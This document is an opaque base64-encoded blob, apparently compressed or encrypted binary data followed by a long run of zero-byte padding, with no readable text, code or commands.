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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA